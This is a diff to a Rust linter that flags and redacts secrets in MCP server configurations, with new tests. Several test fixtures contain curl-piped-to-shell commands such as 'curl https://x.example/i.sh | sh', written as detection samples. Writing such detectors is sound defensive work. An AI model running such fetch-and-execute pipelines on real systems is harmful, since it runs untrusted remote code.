@@ -126,8 +126,41 @@ static KNOWN_SECRETS: LazyLock<Vec<(&'static str, Regex)>> = LazyLock::new(|| {
 static AUTH_SCHEME: LazyLock<Regex> =
     LazyLock::new(|| Regex::new(r#"(?i)\b(bearer|basic)\s+([^\s"']+)"#).expect("valid regex"));
 
-static URL_IN_TEXT: LazyLock<Regex> =
-    LazyLock::new(|| Regex::new(r#"[A-Za-z][A-Za-z0-9+.-]*://[^\s'"<>)]+"#).expect("valid regex"));
+/// A URL inside free text. The user info (up to the last `@` before the host) may contain
+/// characters that would otherwise end the URL, such as `)`, quotes and `<`.
+static URL_IN_TEXT: LazyLock<Regex> = LazyLock::new(|| {
+    Regex::new(r#"[A-Za-z][A-Za-z0-9+.-]*://(?:[^\s/?#]*@)?[^\s'"<>)]+"#).expect("valid regex")
+});
+
+const VALUE: &str = r#""[^"]*"|'[^']*'|[^\s;&|"']+"#;
+
+/// `NAME=value`, also behind `export`, `set`, `$env:` and `--` (group 1 name, group 2 value).
+static ASSIGNMENT: LazyLock<Regex> = LazyLock::new(|| {
+    Regex::new(&format!(r"\b([A-Za-z_][A-Za-z0-9_.-]*)\s*=\s*({VALUE})")).expect("valid regex")
+});
+
+/// `Name: value` as in `-H 'X-Api-Key: value'` (group 1 name, group 2 value to the closing quote).
+static HEADER_LINE: LazyLock<Regex> = LazyLock::new(|| {
+    Regex::new(r#"\b([A-Za-z][A-Za-z0-9_-]*)[ \t]*:[ \t]*([^'"\r\n]*[^'"\r\n\s])"#)
+        .expect("valid regex")
+});
+
+/// `--password value` (group 1 leading space, 2 flag, 3 separator, 4 value).
+static FLAG_VALUE: LazyLock<Regex> = LazyLock::new(|| {
+    Regex::new(r#"(^|\s)(--?[A-Za-z][A-Za-z0-9-]*)(\s+)((?:[^\s"'-][^\s;&|"']*)|"[^"]*"|'[^']*')"#)
+        .expect("valid regex")
+});
+
+/// `curl -u user:pass`, `wget --user=name` (group 1 leading space, 2 flag, 3 separator, 4 value).
+static BASIC_AUTH_FLAG: LazyLock<Regex> = LazyLock::new(|| {
+    Regex::new(&format!(
+        r"(?i)(^|\s)(-u|--user|--proxy-user|--http-user)(\s+|=)({VALUE})"
+    ))
+    .expect("valid regex")
+});
+
+static HTTP_DOWNLOADER: LazyLock<Regex> =
+    LazyLock::new(|| Regex::new(r"(?i)\b(?:curl|wget)\b").expect("valid regex"));
 
 static ENV_REFERENCE: LazyLock<Regex> = LazyLock::new(|| {
     Regex::new(r"^\$[A-Za-z_][A-Za-z0-9_]*$|%[A-Za-z_][A-Za-z0-9_]*%").expect("valid regex")
@@ -195,9 +228,15 @@ const NON_SECRET_SUFFIXES: &[&str] = &[
     "_ID",
     "_NAME",
     "_TYPE",
+    "_STDIN",
 ];
 
 const SENSITIVE_QUERY_PARAMS: &[&str] = &[
+    "code",
+    "jwt",
+    "refresh_token",
+    "client_secret",
+    "id_token",
     "token",
     "key",
     "api_key",
@@ -333,11 +372,9 @@ const RUN_VALUE_FLAGS: &[&str] = &[
 
 pub fn check(configs: &[ServerConfig]) -> Vec<Finding> {
     let mut out = Vec::new();
+    // Clients differ in whether they honour a disabled flag, so every rule still runs.
     for cfg in configs {
         check_secrets(cfg, &mut out);
-        if cfg.disabled {
-            continue;
-        }
         match &cfg.transport {
             Transport::Stdio {
                 command, args, env, ..
@@ -366,10 +403,17 @@ fn finding(
     message: String,
     evidence: &str,
 ) -> Finding {
-    let severity = RULES
+    let mut severity = RULES
         .iter()
         .find(|r| r.id == rule_id)
         .map_or(Severity::Info, |r| r.severity);
+    let mut message = message;
+    if cfg.disabled {
+        message.push_str(" (entry is disabled)");
+        if rule_id != "MW100" {
+            severity = lower_severity(severity);
+        }
+    }
     Finding {
         rule_id,
         severity,
@@ -380,6 +424,16 @@ fn finding(
             file: Some(cfg.source.clone()),
             pointer: Some(format!("{}{suffix}", cfg.pointer)),
         },
+    }
+}
+
+/// One level down, but never below `Low`.
+fn lower_severity(severity: Severity) -> Severity {
+    match severity {
+        Severity::Critical => Severity::High,
+        Severity::High => Severity::Medium,
+        Severity::Medium | Severity::Low => Severity::Low,
+        Severity::Info => Severity::Info,
     }
 }
 
@@ -471,7 +525,32 @@ fn is_literal_secret(value: &str) -> bool {
         && !v.starts_with("https://")
 }
 
-/// Replace every known secret, URL credential and bearer credential in `text` with `***`.
+fn unquote(value: &str) -> &str {
+    value
+        .strip_prefix('"')
+        .and_then(|v| v.strip_suffix('"'))
+        .or_else(|| value.strip_prefix('\'').and_then(|v| v.strip_suffix('\'')))
+        .unwrap_or(value)
+}
+
+fn is_secret_header(name: &str) -> bool {
+    is_secret_name(name)
+        || matches!(
+            name.to_ascii_lowercase().as_str(),
+            "authorization" | "proxy-authorization" | "cookie" | "set-cookie"
+        )
+}
+
+/// Whether `value` hides nothing worth masking (empty, or a reference to a variable).
+fn is_unmasked(value: &str) -> bool {
+    let v = unquote(value).trim();
+    v.is_empty() || is_reference(v)
+}
+
+/// The single redaction for every piece of evidence derived from commands, arguments, URLs and
+/// scripts. Masks known token formats, URL credentials, bearer/basic credentials, secret-named
+/// `NAME=value` assignments (also `export`/`set`/`--flag=`), `--password value` style flags,
+/// values of secret-like headers and `curl -u user:pass`.
 fn redact_text(text: &str) -> String {
     let mut s = URL_IN_TEXT
         .replace_all(text, |c: &regex::Captures| redact_url(&c[0]))
@@ -479,7 +558,48 @@ fn redact_text(text: &str) -> String {
     for (_, re) in KNOWN_SECRETS.iter() {
         s = re.replace_all(&s, "***").into_owned();
     }
+    s = HEADER_LINE
+        .replace_all(&s, |c: &regex::Captures| {
+            let (name, value) = (&c[1], &c[2]);
+            if !is_secret_header(name) || is_unmasked(value) {
+                return c[0].to_string();
+            }
+            let scheme = AUTH_SCHEME
+                .captures(value)
+                .filter(|a| a.get(0).is_some_and(|m| m.start() == 0))
+                .map_or(String::new(), |a| format!("{} ", &a[1]));
+            format!("{name}: {scheme}***")
+        })
+        .into_owned();
+    s = ASSIGNMENT
+        .replace_all(&s, |c: &regex::Captures| {
+            if is_secret_name(&c[1]) && !is_unmasked(&c[2]) {
+                format!("{}=***", &c[1])
+            } else {
+                c[0].to_string()
+            }
+        })
+        .into_owned();
+    s = FLAG_VALUE
+        .replace_all(&s, |c: &regex::Captures| {
+            if is_secret_name(c[2].trim_start_matches('-')) && !is_unmasked(&c[4]) {
+                format!("{}{}{}***", &c[1], &c[2], &c[3])
+            } else {
+                c[0].to_string()
+            }
+        })
+        .into_owned();
+    if HTTP_DOWNLOADER.is_match(&s) {
+        s = BASIC_AUTH_FLAG.replace_all(&s, "$1$2$3***").into_owned();
+    }
     AUTH_SCHEME.replace_all(&s, "$1 ***").into_owned()
+}
+
+/// Whether an inline script assigns a plausible literal value to a secret-named variable.
+fn script_secret_assignment(script: &str) -> bool {
+    ASSIGNMENT
+        .captures_iter(script)
+        .any(|c| is_secret_name(&c[1]) && is_literal_secret(unquote(&c[2])))
 }
 
 // ---------------------------------------------------------------------------------------------
@@ -534,7 +654,9 @@ fn check_secrets(cfg: &ServerConfig, out: &mut Vec<Finding>) {
         ));
     };
     match &cfg.transport {
-        Transport::Stdio { args, env, .. } => {
+        Transport::Stdio {
+            command, args, env, ..
+        } => {
             for (key, value) in env {
                 if let Some((label, red)) = detect(Some(key), value, Source::Env) {
                     report(
@@ -546,10 +668,13 @@ fn check_secrets(cfg: &ServerConfig, out: &mut Vec<Finding>) {
                 }
             }
             let mut prev_flag: Option<&str> = None;
+            let mut reported = Vec::new();
+            let script = inline_script(&prog_name(command), args);
             for (idx, arg) in args.iter().enumerate() {
                 let found = if let Some((label, red)) = detect(None, arg, Source::Arg) {
                     Some((label, red))
                 } else if let Some((k, v)) = arg.split_once('=')
+                    && script.as_ref().is_none_or(|(i, _)| *i != idx)
                     && k.chars()
                         .all(|c| c.is_ascii_alphanumeric() || "_.-".contains(c))
                 {
@@ -564,6 +689,7 @@ fn check_secrets(cfg: &ServerConfig, out: &mut Vec<Finding>) {
                     None
                 };
                 if let Some((label, evidence)) = found {
+                    reported.push(idx);
                     report(
                         format!("/args/{idx}"),
                         format!("Argument {idx}"),
@@ -572,6 +698,17 @@ fn check_secrets(cfg: &ServerConfig, out: &mut Vec<Finding>) {
                     );
                 }
                 prev_flag = (arg.starts_with('-') && !arg.contains('=')).then_some(arg.as_str());
+            }
+            if let Some((idx, script)) = script
+                && !reported.contains(&idx)
+                && script_secret_assignment(&script)
+            {
+                report(
+                    format!("/args/{idx}"),
+                    format!("Argument {idx}"),
+                    "secret-named assignment in an inline script",
+                    redact_text(&script),
+                );
             }
         }
         Transport::Http { url, headers } => {
@@ -657,7 +794,31 @@ fn is_sensitive_param(name: &str) -> bool {
     SENSITIVE_QUERY_PARAMS.contains(&norm.as_str())
 }
 
-/// The URL with user info and the values of sensitive query parameters replaced by `***`.
+/// A path segment that looks like an embedded token: 24+ URL-safe characters with letters
+/// and digits.
+fn is_opaque_segment(seg: &str) -> bool {
+    seg.len() >= 24
+        && seg
+            .chars()
+            .all(|c| c.is_ascii_alphanumeric() || c == '_' || c == '-')
+        && seg.chars().any(|c| c.is_ascii_alphabetic())
+        && seg.chars().any(|c| c.is_ascii_digit())
+}
+
+/// `a=1&token=x` with the values of sensitive parameters replaced by `***`.
+fn redact_params(params: &str) -> String {
+    params
+        .split('&')
+        .map(|p| match p.split_once('=') {
+            Some((k, _)) if is_sensitive_param(k) => format!("{k}=***"),
+            _ => p.to_string(),
+        })
+        .collect::<Vec<_>>()
+        .join("&")
+}
+
+/// The URL with user info, opaque path segments and the values of sensitive query and fragment
+/// parameters replaced by `***`.
 fn redact_url(url: &str) -> String {
     let Some(u) = parse_url(url) else {
         return url.to_string();
@@ -667,21 +828,19 @@ fn redact_url(url: &str) -> String {
         s.push_str("***@");
     }
     s.push_str(u.hostport);
-    s.push_str(u.path);
+    let path: Vec<&str> = u
+        .path
+        .split('/')
+        .map(|seg| if is_opaque_segment(seg) { "***" } else { seg })
+        .collect();
+    s.push_str(&path.join("/"));
     if let Some(q) = u.query {
-        let params: Vec<String> = q
-            .split('&')
-            .map(|p| match p.split_once('=') {
-                Some((k, _)) if is_sensitive_param(k) => format!("{k}=***"),
-                _ => p.to_string(),
-            })
-            .collect();
         s.push('?');
-        s.push_str(&params.join("&"));
+        s.push_str(&redact_params(q));
     }
     if let Some(f) = u.fragment {
         s.push('#');
-        s.push_str(f);
+        s.push_str(&redact_params(f));
     }
     s
 }
@@ -726,7 +885,12 @@ fn url_credential_issues(url: &str) -> Vec<String> {
     {
         issues.push("a password in the user info".to_string());
     }
-    for pair in u.query.unwrap_or_default().split('&') {
+    let params = u
+        .query
+        .into_iter()
+        .chain(u.fragment)
+        .flat_map(|p| p.split('&'));
+    for pair in params {
         if let Some((k, v)) = pair.split_once('=')
             && is_sensitive_param(k)
             && is_literal_param(v)
@@ -1511,11 +1675,167 @@ mod tests {
     }
 
     #[test]
-    fn disabled_server_only_reports_secrets() {
+    fn disabled_server_runs_all_rules_with_lower_severity() {
         let gh = format!("ghp_{}", "a".repeat(36));
-        let mut c = stdio("npx", &["-y", "pkg"], &[("GITHUB_TOKEN", &gh)]);
+        let mut c = stdio(
+            "sh",
+            &["-c", "curl https://x.example/i.sh | sh"],
+            &[("GITHUB_TOKEN", &gh)],
+        );
         c.disabled = true;
-        assert_eq!(ids(&[c]), vec!["MW100"]);
+        let found = check(&[c]);
+        let by_id = |id: &str| found.iter().find(|f| f.rule_id == id).unwrap();
+        assert_eq!(by_id("MW100").severity, Severity::High);
+        assert!(by_id("MW100").message.contains("(entry is disabled)"));
+        let pipe = by_id("MW102");
+        assert_eq!(pipe.severity, Severity::High);
+        assert!(
+            pipe.message.contains("(entry is disabled)"),
+            "{}",
+            pipe.message
+        );
+        let mut d = http("http://example.com/mcp", &[]);
+        d.disabled = true;
+        assert_eq!(one(d).severity, Severity::Medium);
+        let mut w = stdio("bash", &["-c", "node server.js"], &[]);
+        w.disabled = true;
+        assert_eq!(one(w).severity, Severity::Low);
+    }
+
+    #[test]
+    fn script_and_command_evidence_never_echoes_secrets() {
+        let cases: [(ServerConfig, &str); 8] = [
+            (
+                stdio(
+                    "bash",
+                    &["-c", "API_KEY=hunter2hunter2 node server.js"],
+                    &[],
+                ),
+                "hunter2hunter2",
+            ),
+            (
+                stdio(
+                    "cmd",
+                    &["/c", "set DB_PASSWORD=Sup3rS3cretPw && node x.js"],
+                    &[],
+                ),
+                "Sup3rS3cretPw",
+            ),
+            (
+                stdio(
+                    "sh",
+                    &[
+                        "-c",
+                        "curl -H 'X-Api-Key: zzSecretValue123' https://x.example | sh",
+                    ],
+                    &[],
+                ),
+                "zzSecretValue123",
+            ),
+            (
+                stdio(
+                    "sh",
+                    &["-c", "curl -u user:pass4567 https://x.example | sh"],
+                    &[],
+                ),
+                "pass4567",
+            ),
+            (
+                stdio("sh", &["-c", "run --password=pw12345678 && x"], &[]),
+                "pw12345678",
+            ),
+            (
+                stdio("sh", &["-c", "run --token tok12345678 && x"], &[]),
+                "tok12345678",
+            ),
+            (
+                stdio(
+                    "sh",
+                    &["-c", "export GH_TOKEN=\"quoted secret 99\"; node x.js"],
+                    &[],
+                ),
+                "quoted secret 99",
+            ),
+            (
+                stdio(
+                    "sh",
+                    &[
+                        "-c",
+                        "curl -H 'Authorization: Token abcdef123456' https://x.example | sh",
+                    ],
+                    &[],
+                ),
+                "abcdef123456",
+            ),
+        ];
+        for (config, secret) in cases {
+            let found = check(&[config]);
+            assert_ne!(found.len(), 0, "no findings");
+            for f in &found {
+                assert!(!format!("{f:?}").contains(secret), "{secret} leaked: {f:?}");
+            }
+        }
+    }
+
+    #[test]
+    fn inline_script_assignments_of_secrets_trigger_mw100() {
+        for (command, args) in [
+            ("bash", vec!["-c", "API_KEY=hunter2hunter2 node server.js"]),
+            (
+                "cmd",
+                vec!["/c", "set DB_PASSWORD=Sup3rS3cretPw && node x.js"],
+            ),
+        ] {
+            let found = check(&[stdio(command, &args, &[])]);
+            let f = found
+                .iter()
+                .find(|f| f.rule_id == "MW100")
+                .unwrap_or_else(|| {
+                    panic!("no MW100 for {args:?}: {found:?}");
+                });
+            assert_eq!(f.location.pointer.as_deref(), Some("mcpServers/srv/args/1"));
+        }
+        assert!(
+            check(&[stdio("bash", &["-c", "API_KEY=$KEY node s.js"], &[])])
+                .iter()
+                .all(|f| f.rule_id != "MW100")
+        );
+    }
+
+    #[test]
+    fn url_userinfo_with_special_characters_is_caught_and_masked() {
+        let url = "http://admin:p)ssw0rd99@example.com/mcp";
+        let found = check(&[http(url, &[])]);
+        let mut got: Vec<_> = found.iter().map(|f| f.rule_id).collect();
+        got.sort_unstable();
+        assert_eq!(got, ["MW103", "MW104"]);
+        assert!(!format!("{found:?}").contains("ssw0rd99"), "{found:?}");
+        let quoted = check(&[stdio(
+            "srv",
+            &["--url", "https://u:a'b\"c<d@h.example/x"],
+            &[],
+        )]);
+        assert_eq!(quoted.len(), 1, "{quoted:?}");
+        assert_eq!(quoted[0].rule_id, "MW104");
+        assert!(!format!("{quoted:?}").contains("a'b"));
+    }
+
+    #[test]
+    fn redact_url_masks_fragment_new_params_and_opaque_path_segments() {
+        let r = redact_url(
+            "https://h.example/cb?code=abc&jwt=x&refresh_token=r&client_secret=c&id_token=i&q=1#access_token=T0k&state=s",
+        );
+        assert_eq!(
+            r,
+            "https://h.example/cb?code=***&jwt=***&refresh_token=***&client_secret=***&id_token=***&q=1#access_token=***&state=s"
+        );
+        let seg = "AbC123xyz0AbC123xyz0AbC123";
+        let r = redact_url(&format!("https://h.example/s/{seg}/mcp"));
+        assert_eq!(r, "https://h.example/s/***/mcp");
+        assert_eq!(
+            redact_url("https://h.example/api/v1/organizations/mcp-server-filesystem"),
+            "https://h.example/api/v1/organizations/mcp-server-filesystem"
+        );
     }
 
     #[test]
